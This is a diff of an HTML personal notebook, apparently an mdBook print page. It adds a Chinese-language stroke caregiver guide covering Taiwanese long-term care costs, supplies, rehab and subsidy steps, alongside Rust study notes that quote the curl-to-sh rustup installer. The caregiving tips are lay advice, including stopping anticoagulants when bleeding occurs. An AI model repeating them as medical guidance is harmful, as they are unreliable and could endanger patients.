 <div style="break-before: page; page-break-before: always;"></div><h1 id="dbs-資料庫"><a class="header" href="#dbs-資料庫">Dbs 資料庫</a></h1>
@@ -2222,7 +2349,479 @@ https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
 使用markly
 4.0K -rw-r--r-- 1 dayrain dayrain 2.3K 12月  9 03:19 xxx.html  
 </code></pre>
-<p>結論： rust markly的輸出精簡，足夠基本的使用，不過當在vscode複製貼上markdown內容，其實也會將vscode的theme顏色也一併產生，我反而覺得配色比較好看，缺點就是寬度不會跟著限縮，有空再來研究看看是哪裡要改善。  </p>
+<p>結論： rust markly的輸出精簡，足夠基本的使用，不過當在vscode複製貼上markdown內容，其實也會將vscode的theme顏色也一併產生，我反而覺得配色比較好看，缺點就是寬度不會跟著限縮，有空再來研究看看是哪裡要改善。</p>
+<div style="break-before: page; page-break-before: always;"></div><ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E4%B8%AD%E9%A2%A8%E5%AE%B6%E5%B1%AC%E7%94%9F%E5%AD%98%E6%89%8B%E5%86%8A-level-101stroke-family-survival-guide-level-101">中風家屬生存手冊 Level 101(Stroke Family Survival Guide Level 101)</a>
+<ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%86%AB%E9%99%A2%E5%B1%85%E5%AE%B6%E9%95%B7%E7%85%A720%E8%AD%B7%E7%90%86%E4%B9%8B%E5%AE%B6-%E6%AF%94%E8%BC%83">醫院/居家長照2.0/護理之家 比較</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E8%BC%94%E5%85%B7">輔具</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E8%80%97%E6%9D%90">耗材</a>
+<ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%B1%85%E4%BD%8F%E9%86%AB%E9%99%A2%E6%99%82">居住醫院時</a>
+<ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E4%B8%80%E8%88%AC%E7%94%9F%E6%B4%BB%E8%80%97%E6%9D%90%E7%94%A8%E5%93%81">一般生活耗材/用品</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%86%AB%E7%99%82%E8%80%97%E6%9D%90">醫療耗材</a></li>
+</ul>
+</li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%B1%85%E5%AE%B6%E6%99%82">居家時</a>
+<ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E4%B8%80%E8%88%AC%E7%94%9F%E6%B4%BB%E8%80%97%E6%9D%90%E7%94%A8%E5%93%81-1">一般生活耗材/用品</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%86%AB%E7%99%82%E8%80%97%E6%9D%90%E7%94%A8%E5%93%81">醫療耗材/用品</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E8%87%A5%E5%BA%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85">臥床注意事項</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%BE%A9%E5%81%A5">復健</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%95%B7%E7%85%A720">長照2.0</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E6%BA%96%E5%82%99%E4%BA%8B%E9%A0%85">準備事項</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%86%AB%E9%99%A2">醫院</a>
+<ul>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%B0%BF%E8%A2%8B">尿袋</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E6%8E%92%E4%BE%BF">排便</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E4%BE%BF%E7%A7%98">便秘</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E8%BC%94%E5%8A%A9%E7%94%B3%E8%AB%8B">輔助申請</a></li>
+</ul>
+</li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E9%95%B7%E7%85%A7%E5%85%AC%E5%8F%B8">長照公司</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%B1%85%E5%AE%B6">居家</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E7%9B%B8%E9%97%9C%E8%B3%87%E6%BA%90">相關資源</a></li>
+<li><a href="life/Stroke_Family_Survival_Guide_Level_101.html#%E5%8F%83%E8%80%83%E7%B6%B2%E9%A0%81">參考網頁</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="中風家屬生存手冊-level-101stroke-family-survival-guide-level-101"><a class="header" href="#中風家屬生存手冊-level-101stroke-family-survival-guide-level-101">中風家屬生存手冊 Level 101(Stroke Family Survival Guide Level 101)</a></h1>
+<h2 id="醫院居家長照20護理之家-比較"><a class="header" href="#醫院居家長照20護理之家-比較">醫院/居家長照2.0/護理之家 比較</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>項目</th><th>醫院</th><th>居定長照2.0</th><th>護理之家</th></tr></thead><tbody>
+<tr><td>住宿時長</td><td>24H</td><td>24H</td><td>24H/3H or 4H喘息</td></tr>
+<tr><td>探視</td><td>AM 9 ~ AM 21H</td><td>N/A</td><td>0.5H/1H~1.5H/2H</td></tr>
+<tr><td>居服員</td><td>N/A</td><td>NT770/2H</td><td>N/A</td></tr>
+<tr><td>看護員</td><td>2800/天</td><td>N/A</td><td>3萬/月</td></tr>
+<tr><td>居家護理</td><td>N/A</td><td>NT250/次()車費</td><td>N/A</td></tr>
+<tr><td>居家看診</td><td>N/A</td><td>居定護理+ NT7X</td><td>N/A</td></tr>
+<tr><td>居定復能治療師</td><td>N/A</td><td>NT240/次</td><td>另計</td></tr>
+<tr><td>診斷證明</td><td>申請(保險用)</td><td>N/A</td><td>N/A</td></tr>
+<tr><td>病歷摘要</td><td>申請</td><td>N/A</td><td>入院前評估用</td></tr>
+<tr><td>失能度評估</td><td>申請</td><td>N/A</td><td>N/A</td></tr>
+<tr><td>巴氏評量表</td><td>申請(效期3個月)</td><td>N/A</td><td>N/A</td></tr>
+<tr><td>身障手冊</td><td>申請</td><td>N/A</td><td>N/A</td></tr>
+</tbody></table>
+</div>
+<h2 id="輔具"><a class="header" href="#輔具">輔具</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>項次</th><th>品項</th><th>長照</th><th>原價</th></tr></thead><tbody>
+<tr><td>1.</td><td>電動床</td><td>NT18000</td><td>NT32000</td></tr>
+<tr><td>2.</td><td>電動氣塾床塾</td><td>NT12000</td><td>NT12000</td></tr>
+<tr><td>3.</td><td>輪椅(B+A) NT7800</td><td>NT18500</td><td>NT</td></tr>
+<tr><td>4.</td><td>ㄇ字助行器</td><td>NT800</td><td>NT</td></tr>
+<tr><td>5.</td><td>便盆椅</td><td>NT</td><td>NT</td></tr>
+</tbody></table>
+</div>
+<ul>
+<li>1+2+3+4<br />
+18000+12000+18500+800=39300</li>
+</ul>
+<p>NT32000+NT18500+NT12000 = NT62500<br />
+政府輔助上限NT40000(身障人士),一般戶NT32500<br />
+NT62500-NT32500=NT30000(自費)</p>
+<h2 id="耗材"><a class="header" href="#耗材">耗材</a></h2>
+<h3 id="居住醫院時"><a class="header" href="#居住醫院時">居住醫院時</a></h3>
+<h4 id="一般生活耗材用品"><a class="header" href="#一般生活耗材用品">一般生活耗材/用品</a></h4>
+<ol>
+<li>指甲剪x1</li>
+<li>挖耳棒x1</li>
+<li>杯子x1</li>
+<li>毛巾(臉/身體/乾)x3</li>
+<li>牙膏(夜用型)x1</li>
+<li>牙刷x1</li>
+<li>潄口盆</li>
+<li>毛帽x1</li>
+<li>毛襪x2</li>
+<li>筷子x1</li>
+<li>湯匙x2</li>
+<li>筆記本x1</li>
+<li>眼罩x1</li>
+<li>牙線棒x100</li>
+</ol>
+<h4 id="醫療耗材"><a class="header" href="#醫療耗材">醫療耗材</a></h4>
+<ol>
+<li>臉盆(中)x1</li>
+<li>沖洗器x1</li>
+<li>彈性繃帶x2</li>
+<li>紙尿褲</li>
+<li>紙尿片(無尿管者)</li>
+<li>看護塾(醫院有中單可以用則免)</li>
+</ol>
+<h3 id="居家時"><a class="header" href="#居家時">居家時</a></h3>
+<h4 id="一般生活耗材用品-1"><a class="header" href="#一般生活耗材用品-1">一般生活耗材/用品</a></h4>
+<ol>
+<li>小夜燈x1</li>
+<li>監視器x2</li>
+<li>延長線x2</li>
+<li>水瓶x1</li>
+<li>耳溫槍x1</li>
+<li>護腰x1</li>
+<li>熱敷塾x1</li>
+<li>中頻電療機x1</li>
+<li>氣動式手部復健機x1</li>
+<li>復健機x1(可腳踏/手轉),電動或手動</li>
+<li>露營椅/折疊椅x1(供居服員坐)</li>
+<li>前開扣式上衣(uniqlo襯彬,好洗快乾)</li>
+<li>電暖器x1,可設定溫度控制者則佳</li>
+<li>餐盤x2</li>
+<li>3M小方巾x6</li>
+<li>加溼器x1</li>
+<li>牙線棒x100</li>
+<li>垃圾筒x1</li>
+<li>籃子/水瓶掛籃/水杯架,魔鬼氈固定在床邊,可找大創的廚房用具,瀝菜瓜布的籃子</li>
+<li>長條魔鬼氈x8,正反面二面的,大創或五金百貨</li>
+<li>束線(可解開式的)</li>
+<li>餐巾紙,一整捲</li>
+<li>保鮮袋x10</li>
+<li>保溫盒x3</li>
+<li>止滑塾x3,大/中/小/長條</li>
+<li>小枕頭x3</li>
+<li>洗衣籃x1</li>
+<li>不銹鋼夾子x4</li>
+<li>筆記本x1(居服員交接)</li>
+<li>生理記錄表,體溫/耳溫/血壓/血糖/心跳</li>
+</ol>
+<h4 id="醫療耗材用品"><a class="header" href="#醫療耗材用品">醫療耗材/用品</a></h4>
+<ol>
+<li>強力施美(溼疹)</li>
+<li>美康(溼疹)</li>
+<li>紙尿布/復健褲</li>
+<li>小尿布/紙尿片</li>
+<li>看護塾</li>
+<li>透氣膠帶,皮膚敏感者可改用嬰兒用膠帶</li>
+<li>凡士林(大罐x1</li>
+<li>保溼乳液x1</li>
+<li>馬油x1</li>
+<li>口含凝膠</li>
+<li>黑棗露, 便秘者</li>
+<li>蔓越莓汁</li>
+</ol>
+<h2 id="臥床注意事項"><a class="header" href="#臥床注意事項">臥床注意事項</a></h2>
+<ol>
+<li>枕頭切齊床塾邊</li>
+<li>房膀在第二節前的一個拳頭(視床塾長度而定),屁股位置在床中左右(視電動床曲折時中心點而定)</li>
+<li>電動氣塾床塾,頭部三節是固定充氣的,不會消</li>
+<li>搬動時,手勾或移動關結處是最省力的,肩關結/寬關結/膝關結</li>
+<li>床邊隔離,如手腳部要放枕頭或餐桌板,避免手腳掉出床邊</li>
+</ol>
+<h2 id="復健"><a class="header" href="#復健">復健</a></h2>
+<ol>
+<li>拍打按摩穴位/部位,刺激方式增加反應</li>
+<li>常翻身,有氣塾床也要注意氣塾床位置</li>
+<li>找出疼痛點,注意到神經/肌肉位置處,像是坐股神經痛,有痛或反射或觸感,持續加強觀察狀況</li>
+<li>說明精準
+<ol>
+<li>痛處位置</li>
+<li>痛處狀態</li>
+<li>疼痛點的情況
+<ol>
+<li>漲/酸/抽痛/刺痛</li>
+<li>持續痛/一陣一陣/偶爾/特殊姿勢時發生</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>每日進行的
+<ol>
+<li>次數,10次為一個單位,做5個單位</li>
+<li>力度,由輕持續加重,避免肌肉僵硬</li>
+<li>時間,每日1到2小時一次</li>
+</ol>
+</li>
+<li>讓病患自行做動作
+<ol>
+<li>吃飯</li>
+<li>擦嘴</li>
+<li>抓癢</li>
+<li>站立時,抱住上半身時,讓病患用腳支撑或進行曲膝動作</li>
+<li>將上身移動或換尿布時,讓病患用腳支撑抬高屁股,或是翻身動抓欄杆</li>
+</ol>
+</li>
+</ol>
+<h2 id="長照20"><a class="header" href="#長照20">長照2.0</a></h2>
+<ol>
+<li>居家照護,依長照服務項目來計算時間,依長照2.0時數加總,超過一定時數後就要自費</li>
+<li>喘息服務,全項目服務,
+<ol>
+<li>全自費項目</li>
+<li>補助,有次數限制</li>
+</ol>
+</li>
+<li>長照專車接送,每月8張票卷(來回4趟,面額NT100,單次可用多張),發放2~3個月份</li>
+<li>長照項目,參考政府公告的清單與細節
+<ol>
+<li>需使用的項目,項目說明裡的時間與頻率次數,服務內容</li>
+<li>留意長照公司所開的服務頻率和備註,有些列出項目為備用</li>
+<li>不在服務項目中的,居服員是不會予以協助的,像是協助進食不包含洗餐具</li>
+</ol>
+</li>
+</ol>
+<h2 id="準備事項"><a class="header" href="#準備事項">準備事項</a></h2>
+<ol>
+<li>物品清單</li>
+<li>活動範圍(居服員)
+<ol>
+<li>廚房</li>
+<li>臥室</li>
+<li>浴室/廁所</li>
+<li>客廳</li>
+</ol>
+</li>
+<li>攞放位置</li>
+<li>清潔衛生
+<ol>
+<li>吃飯用圍巾(圍嘟嘟),防水格紋的好用,有4號魔鬼氈黏貼往上對黏,可防止食物外流</li>
+<li>浴帽,防水流向眼睛,可以小孩用的來改</li>
+<li>溼紙巾</li>
+<li>衛生紙</li>
+<li>垃圾袋,小/中</li>
+<li>生理食鹽水x4</li>
+<li>紗布</li>
+<li>綿簽x10,中/大</li>
+</ol>
+</li>
+<li>輔具需求
+<ol>
+<li>輪椅
+<ol>
+<li>用餐</li>
+<li>移動</li>
+</ol>
+</li>
+<li>餐桌板
+<ol>
+<li>輸椅用</li>
+<li>病床用</li>
+</ol>
+</li>
+<li>便盆椅
+<ol>
+<li>大小便</li>
+<li>洗澡</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="醫院"><a class="header" href="#醫院">醫院</a></h2>
+<ol>
+<li>個管師
+<ol>
+<li>長照2.0,請向護理站提出申請</li>
+<li>輔助補助</li>
+<li>長照公司媒合</li>
+<li>失能鑑定申請</li>
+<li>相關申請</li>
+</ol>
+</li>
+<li>護理師
+<ol>
+<li>診斷證明申請</li>
+</ol>
+</li>
+<li>醫師
+<ol>
+<li>開藥</li>
+<li>居家看診</li>
+<li>巴氏評量表
+<ol>
+<li>外籍看護/幫傭
+<ol>
+<li>24H</li>
+<li>包吃住</li>
+<li>節日加班費</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>身障手冊(申請),首次評估需要醫院指定部門,</li>
+</ol>
+</li>
+<li>居定證理師
+<ol>
+<li>尿管拔除評估</li>
+<li>居家狀況評估</li>
+</ol>
+</li>
+<li>復能治療師
+<ol>
+<li>初期
+<ol>
+<li>基本上下床動作教學</li>
+<li>復健動作教學</li>
+<li>只做教學,不會進行復健療程</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>救護車
+<ol>
+<li>單趟NT1400,依各家醫院訂價</li>
+</ol>
+</li>
+</ol>
+<h3 id="尿袋"><a class="header" href="#尿袋">尿袋</a></h3>
+<ol>
+<li>管路平時需要揉搜,防止沉澱物附著在管路中或變色</li>
+<li>注意沉澱物或漂浮物</li>
+<li>顏色</li>
+<li>排尿量/喝水量</li>
+<li>分秘物
+<ol>
+<li>喝蔓越莓汁改善?</li>
+</ol>
+</li>
+<li>尿布疹,膠帶起疹子</li>
+</ol>
+<h3 id="排便"><a class="header" href="#排便">排便</a></h3>
+<ol>
+<li>軟硬度</li>
+<li>排放量,用常見大小描述量</li>
+<li>便盆可先鋪4張衛生紙成十字或X狀,中央部份交疊,讓大便不會直接附著黏在盆子上,可快速反扣倒入馬桶,用水沖時方便不殘留</li>
+</ol>
+<h3 id="便秘"><a class="header" href="#便秘">便秘</a></h3>
+<ol>
+<li>羽衣甘藍益生菌</li>
+<li>瀉劑(請醫生開)</li>
+<li>運動</li>
+<li>腹部按摩</li>
+<li>如有出血,停用抗凝血的藥,並向居家護理師與醫生咨詢</li>
+</ol>
+<h3 id="輔助申請"><a class="header" href="#輔助申請">輔助申請</a></h3>
+<ol>
+<li>個管師申請</li>
+<li>輔具評估的老師到府評估</li>
+<li>公文核發</li>
+<li>採購</li>
+<li>公文交付廠商(如果是向店家購買時)</li>
+</ol>
+<h2 id="長照公司"><a class="header" href="#長照公司">長照公司</a></h2>
+<ol>
+<li>自費(16%),按各項目計時計費</li>
+<li>喘息服務,2小時/次(100%自費)</li>
+<li>付費,隔月底前轉帳結清</li>
+</ol>
+<h2 id="居家"><a class="header" href="#居家">居家</a></h2>
+<ol>
+<li>地形圖</li>
+<li>物品清單,依各地區列表</li>
+<li>交接注意事項</li>
+<li>生理記錄</li>
+<li>耗材存放位置</li>
+<li>食物存放位置
+<ol>
+<li>餐桌,
+<ol>
+<li>水果</li>
+<li>零食</li>
+<li>奶粉</li>
+<li>燕麥粥/玉米濃湯</li>
+</ol>
+</li>
+<li>冰箱,食物清單</li>
+<li>開飲機</li>
+<li>飲水杯,水瓶定期清理,否則會有生長生物黏膜,摸起來觸怠滑滑的即是生物黏膜</li>
+</ol>
+</li>
+<li>衛生清潔物品位置
+<ol>
+<li>抹布</li>
+<li>毛巾
+<ol>
+<li>不同區域用顏色,衛生安全考量</li>
+</ol>
+</li>
+<li>尿布</li>
+<li>餐具</li>
+<li>保鮮盒</li>
+<li>垃圾袋</li>
+<li>餐盤
+<ol>
+<li>搭配圍巾後,可放在肚子或胸口上吃,方便快速乾淨</li>
+</ol>
+</li>
+<li>陽台
+<ol>
+<li>洗衣機</li>
+<li>晾衣服位置</li>
+</ol>
+</li>
+<li>衣架,室內晾毛巾,浴室盡量不要放毛巾牙刷等物品,容易會生長紅色黴菌</li>
+</ol>
+</li>
+<li>衣服位置</li>
+<li>連絡工具/方式</li>
+<li>手機</li>
+<li>Line/其他</li>
+<li>智慧燈泡,方便手機App可控制</li>
+<li>電扇</li>
+<li>冷氣開關</li>
+<li>電視開關,固定在床邊欄杆</li>
+<li>電動床開關,固定在床邊欄杆</li>
+<li>溫溼度計</li>
+<li>露營或軍用毛毯,厚在內,薄的在外</li>
+<li>一般厚毛毯</li>
+<li>窗戶通風</li>
+<li>便盆椅
+<ol>
+<li>可加一個高的小椅子在前面踩著,讓膝蓋高過骨盆,呈現蹲姿會更加幫排便</li>
+</ol>
+</li>
+<li>斜坡格,方便便盆椅進出浴室,量好相關高度寬度長度(斜度),可去特力屋訂製木頭的,NT1000以內左右</li>
+<li>決定權
+<ol>
+<li>事物決定由誰為主</li>
+<li>非家屬人員進出,居服員需先通知家屬</li>
+<li>缺少或需求物品,由誰決定,誰採買</li>
+</ol>
+</li>
+<li>居服員上下班前處理事項
+<ol>
+<li>補充水瓶水</li>
+<li>床鋪整理</li>
+<li>蓋好棉被</li>
+</ol>
+</li>
+<li>洗澡
+<ol>
+<li>洗潔精用哪些</li>
+<li>臉盆大小</li>
+<li>用哪條毛巾洗臉,哪條擦身體,哪條擦乾</li>
+<li>洗完後,便盆椅建議用電風扇吹乾</li>
+</ol>
+</li>
+<li>一個2分升塑膠桶,排尿時用</li>
+</ol>
+<h2 id="相關資源"><a class="header" href="#相關資源">相關資源</a></h2>
+<ol>
+<li>PAC(Post-acute Care) 急性後期之醫療整合照護模式</li>
+<li>政府長照專線 1966</li>
+<li>長照2.0
+<ol>
+<li>個管師,協調且整合病患的醫療、心理、社會和其他相關需求，提供全面的健康照護和支持。並與其家屬制定治療計畫、協調醫療團隊、維護病患權益等。</li>
+<li>失能等級評鑑,達到足夠等級才能申請一些項目</li>
+<li>輔具輔助評鑑(購買)</li>
+</ol>
+</li>
+<li>巴氏評量表,申請外籍看護,可在醫院時就先向醫師提出申請</li>
+<li>身障手冊,地方區公所,社會科領取申請表
+<ol>
+<li>3個月內照片1~3張</li>
+<li>申請人身份證</li>
+<li>申請人印章</li>
+<li>將申請表交至醫院醫師,交付前需先確認該醫師會接收</li>
+<li>首次申請的第一次評估會在醫院,需申請人到場</li>
+<li>4~6週後等通知</li>
+</ol>
+</li>
+<li>輔具中心(現公扺押,借用),各大縣市</li>
+</ol>
+<h2 id="參考網頁-6"><a class="header" href="#參考網頁-6">參考網頁</a></h2>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="learning-生活學習"><a class="header" href="#learning-生活學習">Learning 生活學習</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="7個習慣"><a class="header" href="#7個習慣">7個習慣</a></h1>
 <ul>
@@ -2332,7 +2931,7 @@ https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
 <h3 id="應用軟體"><a class="header" href="#應用軟體">應用軟體</a></h3>
 <h3 id="社群軟體"><a class="header" href="#社群軟體">社群軟體</a></h3>
 <h3 id="ide軟體"><a class="header" href="#ide軟體">IDE軟體</a></h3>
-<h2 id="參考網頁-4"><a class="header" href="#參考網頁-4">參考網頁</a></h2>
+<h2 id="參考網頁-7"><a class="header" href="#參考網頁-7">參考網頁</a></h2>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="工具網站-tools-bookmark"><a class="header" href="#工具網站-tools-bookmark">工具網站, Tools Bookmark</a></h1>
 <h2 id="證照認證-cert"><a class="header" href="#證照認證-cert">證照/認證, Cert</a></h2>
 <h3 id="課程研討會-course--conference"><a class="header" href="#課程研討會-course--conference">課程/研討會, Course / Conference</a></h3>
@@ -2345,7 +2944,7 @@ https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
 <h3 id="逆向工程-reverse-engine"><a class="header" href="#逆向工程-reverse-engine">逆向工程， Reverse engine</a></h3>
 <p><a href="https://bin.re">bin.re</a></p>
 <h3 id="雜誌-magazine"><a class="header" href="#雜誌-magazine">雜誌， Magazine</a></h3>
-<p><a href="https://www.infosecurity-magazine.com">infosecurity-magazine</a>  </p>
+<p><a href="https://www.infosecurity-magazine.com">infosecurity-magazine</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="漫漫自學學習之旅的心得記錄"><a class="header" href="#漫漫自學學習之旅的心得記錄">漫漫自學學習之旅的心得記錄</a></h1>
 <ul>
 <li>自學要看每個人的主動性與自制力</li>
@@ -2383,7 +2982,7 @@ https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
 <tr><td>\</td><td>backslash</td><td>反斜線</td></tr>
 <tr><td>:</td><td>colon</td><td>冒號</td></tr>
 <tr><td>;</td><td>semicolon</td><td>分號</td></tr>
-<tr><td>&quot;</td><td>double quotation mark</td><td>雙引號</td></tr>
+<tr><td>"</td><td>double quotation mark</td><td>雙引號</td></tr>
 <tr><td>'</td><td>single quotation mark</td><td>單引號</td></tr>
 <tr><td>&lt;</td><td>less than</td><td>小於</td></tr>
 <tr><td>,</td><td>comma</td><td>逗號</td></tr>
@@ -2405,7 +3004,7 @@ https://www.youtube.com/watch?v=sV9M4LKKT9s</p>
 — （長連接符（em dash））
 ― （單橫槓（horizontal bar））
 </code></pre>
-<h2 id="參考網頁-5"><a class="header" href="#參考網頁-5">參考網頁</a></h2>
+<h2 id="參考網頁-8"><a class="header" href="#參考網頁-8">參考網頁</a></h2>
 <p>https://zh.wiktionary.org/wiki/-<br />
 https://zh.wikipedia.org/zh-tw/%E9%80%A3%E5%AD%97%E6%9A%A8%E6%B8%9B%E8%99%9F<br />
 <a href="https://jakubmarian.com/hyphen-minus-en-dash-and-em-dash-difference-and-usage-in-english/">連字符、減號、短破折號和長破折號：英語中的區別和用法</a></p>
@@ -2471,11 +3070,11 @@ https://zh.wikipedia.org/zh-tw/%E9%80%A3%E5%AD%97%E6%9A%A8%E6%B8%9B%E8%99%9F<br 
 <div style="break-before: page; page-break-before: always;"></div><h1 id="program-debug"><a class="header" href="#program-debug">program debug</a></h1>
 <h2 id="工具-1"><a class="header" href="#工具-1">工具</a></h2>
 <p><a href="https://github.com/namhyung/uftrace">uftrace github</a></p>
-<h2 id="參考網頁-6"><a class="header" href="#參考網頁-6">參考網頁</a></h2>
+<h2 id="參考網頁-9"><a class="header" href="#參考網頁-9">參考網頁</a></h2>
 <p><a href="https://hackmd.io/@st9540808/Hka7sdhzI">uftrace, Function Tracing</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="go-lang"><a class="header" href="#go-lang">Go Lang</a></h1>
-<h2 id="參考網頁-7"><a class="header" href="#參考網頁-7">參考網頁</a></h2>
-<p><a href="https://blog.canopas.com/1-min-guide-to-golang-development-best-practices-in-2022-b50d846fd6c">1 min guide to Golang development best practices in 2022</a>  </p>
+<h2 id="參考網頁-10"><a class="header" href="#參考網頁-10">參考網頁</a></h2>
+<p><a href="https://blog.canopas.com/1-min-guide-to-golang-development-best-practices-in-2022-b50d846fd6c">1 min guide to Golang development best practices in 2022</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="rust-notes"><a class="header" href="#rust-notes">rust notes</a></h1>
 <ol>
 <li>future</li>
@@ -2485,7 +3084,7 @@ https://zh.wikipedia.org/zh-tw/%E9%80%A3%E5%AD%97%E6%9A%A8%E6%B8%9B%E8%99%9F<br 
 <li>所有權機制</li>
 <li>借用</li>
 <li>生命週期</li>
-<li>RAII </li>
+<li>RAII</li>
 <li>affine type</li>
 <li>FFI, C-ABI</li>
 <li>safe / unsafe(外部/kernel)</li>
@@ -2507,15 +3106,15 @@ https://zh.wikipedia.org/zh-tw/%E9%80%A3%E5%AD%97%E6%9A%A8%E6%B8%9B%E8%99%9F<br 
 <p>https://guix.gnu.org</p>
 <h2 id="icon"><a class="header" href="#icon">icon</a></h2>
 <p>https://icons8.com</p>
-<h2 id="參考網頁-8"><a class="header" href="#參考網頁-8">參考網頁</a></h2>
-<p><a href="https://segmentfault.com/a/1190000040591394">Rust 使用 libloading 的入门笔记</a>  </p>
+<h2 id="參考網頁-11"><a class="header" href="#參考網頁-11">參考網頁</a></h2>
+<p><a href="https://segmentfault.com/a/1190000040591394">Rust 使用 libloading 的入门笔记</a></p>
 <div style="break-before: page; page-break-before: always;"></div><p>＃ rust package</p>
 <h2 id="cargo"><a class="header" href="#cargo">cargo</a></h2>
 <ul>
 <li>安裝 crate.io 上的程式
 <ul>
 <li>cargo install markdown2html<br />
-<a href="https://magiclen.org/markdown2html-converter">markdown2html</a>  </li>
+<a href="https://magiclen.org/markdown2html-converter">markdown2html</a></li>
 </ul>
 </li>
 </ul>
@@ -2611,9 +3210,9 @@ Cargo.lock # 追蹤dependencies，不需手動更改</p>
 <p>第三方/外部程式包稱做 crate</p>
 <pre><code>[package]
 
-name = &quot;test&quot;
-version = &quot;0.0.1&quot;
-authors = [&quot;test&lt;test@test.com&gt;&quot;]
+name = "test"
+version = "0.0.1"
+authors = ["test&lt;test@test.com&gt;"]
 </code></pre>
 <ul>
 <li>
@@ -2781,7 +3380,7 @@ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh<br />
 <p>解引用（dereferencing）</p>
 <ul>
 <li>符號 *，例: *s1</li>
-<li>當要變更數值時，要先解除&quot;引用&quot;</li>
+<li>當要變更數值時，要先解除"引用"</li>
 </ul>
 </li>
 </ul>
@@ -2808,7 +3407,7 @@ let b = &amp;mut s1;<br />
 <ul>
 <li>引用型別：切片（slices）</li>
 </ul>
-<pre><code>    let s = String::from(&quot;hello world&quot;);
+<pre><code>    let s = String::from("hello world");
     let hello = &amp;s[0..5]; // &amp;s[..5]
     let world = &amp;s[6..11]; //&amp;s[6..]
     let hello_world = &amp;s[..]; all
@@ -2843,12 +3442,12 @@ let b = &amp;mut s1;<br />
 <pre><code>    let user2 = User {
         active: user1.active,
         username: user1.username,
-        email: String::from(&quot;another@example.com&quot;),
+        email: String::from("another@example.com"),
         sign_in_count: user1.sign_in_count,
     };
 
     let user2 = User {
-        email: String::from(&quot;another@example.com&quot;),
+        email: String::from("another@example.com"),
         ..user1
     };
 </code></pre>
@@ -2888,14 +3487,14 @@ enum IpAddr {
   }
 
 let home = IpAddr::V4(127, 0, 0, 1);
-let loopback = IpAddr::V6(String::from(&quot;::1&quot;));
+let loopback = IpAddr::V6(String::from("::1"));
 </code></pre>
 <ul>
 <li>
 <p>變體（variants）</p>
 </li>
 <li>
-<p>對&quot;結構體&quot;定義&quot;方法&quot;</p>
+<p>對"結構體"定義"方法"</p>
 </li>
 </ul>
 <pre><code>impl Message {
@@ -2904,7 +3503,7 @@ let loopback = IpAddr::V6(String::from(&quot;::1&quot;));
         }
 }
 
-let m = Message::Write(String::from(&quot;hello&quot;));
+let m = Message::Write(String::from("hello"));
 m.call();
 </code></pre>
 <ul>
@@ -3031,12 +3630,12 @@ match v.get(2) {</p>
 </ul>
 </li>
 </ul>
-<pre><code>let data = &quot;初始內容&quot;;
+<pre><code>let data = "初始內容";
 let s = data.to_string();
-let s = &quot;初始內容&quot;.to_string();
-let s = String::from(&quot;初始內容&quot;);
-let s1 = String::from(&quot;Hello, &quot;);
-let s2 = String::from(&quot;world!&quot;);
+let s = "初始內容".to_string();
+let s = String::from("初始內容");
+let s1 = String::from("Hello, ");
+let s2 = String::from("world!");
 let s3 = s1 + &amp;s2;  //此陳述式實際上是取得 s1 的所有權、追加一份 s2 的複製內容、然後回傳最終結果的所有權
 </code></pre>
 <ul>
@@ -3049,16 +3648,16 @@ let s3 = s1 + &amp;s2;  //此陳述式實際上是取得 s1 的所有權、追�
 </ul>
 <pre><code>use std::collections::HashMap;
 let mut scores = HashMap::new();
-scores.insert(String::from(&quot;藍隊&quot;), 10);
-scores.insert(String::from(&quot;黃隊&quot;), 50);
+scores.insert(String::from("藍隊"), 10);
+scores.insert(String::from("黃隊"), 50);
 
 use std::collections::HashMap;
-let teams = vec![String::from(&quot;藍隊&quot;), String::from(&quot;黃隊&quot;)];
+let teams = vec![String::from("藍隊"), String::from("黃隊")];
 let initial_scores = vec![10, 50];
 let mut scores: HashMap&lt;_, _&gt; =
         teams.into_iter().zip(initial_scores.into_iter()).collect();
 
